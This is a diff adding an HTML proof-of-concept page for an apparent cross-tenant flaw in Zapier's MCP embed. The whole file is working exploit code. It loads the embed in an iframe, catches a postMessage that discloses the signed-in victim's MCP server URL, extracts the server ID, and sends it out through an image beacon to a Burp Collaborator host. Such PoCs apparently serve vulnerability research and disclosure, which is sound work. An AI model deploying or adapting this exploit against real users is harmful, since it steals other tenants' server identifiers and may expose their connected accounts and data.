@@ -1,0 +1,35 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Zapier MCP Embed cross-tenant PoC</title>
+<h1>Zapier MCP Embed cross-tenant PoC</h1>
+<p>Open this page while signed in to Zapier as the victim. Do not click inside the embed.</p>
+<pre id="status">Waiting for the embed to disclose the victim MCP server URL...</pre>
+<iframe
+  src="https://mcp.zapier.com/embed?embedId=96e091d4-559c-4bcd-baff-c1b9cfcec23b"
+  width="640"
+  height="420"
+  style="border:1px solid #ccc"
+></iframe>
+<script>
+const COLLABORATOR = 'lh6c3n0r0o10f21utltpbwsodfj67wvl.oastify.com';
+const status = document.getElementById('status');
+let sent = false;
+
+window.addEventListener('message', (event) => {
+  if (event.origin !== 'https://mcp.zapier.com' || sent) return;
+  if (event.data?.type !== 'mcp-server-url') return;
+
+  const serverUrl = event.data?.data?.serverUrl;
+  const match = String(serverUrl).match(/\/api\/mcp\/embed\/([0-9a-f-]{36})\/mcp/i);
+  if (!match) {
+    status.textContent = 'Received an unexpected MCP server URL: ' + String(serverUrl);
+    return;
+  }
+
+  sent = true;
+  const serverId = match[1];
+  const beacon = new Image();
+  beacon.src = `https://${COLLABORATOR}/zapier-mcp-embed/${serverId}?cache=${Date.now()}`;
+  status.textContent = 'Captured victim MCP server ID and sent it to Burp Collaborator: ' + serverId;
+});
+</script>
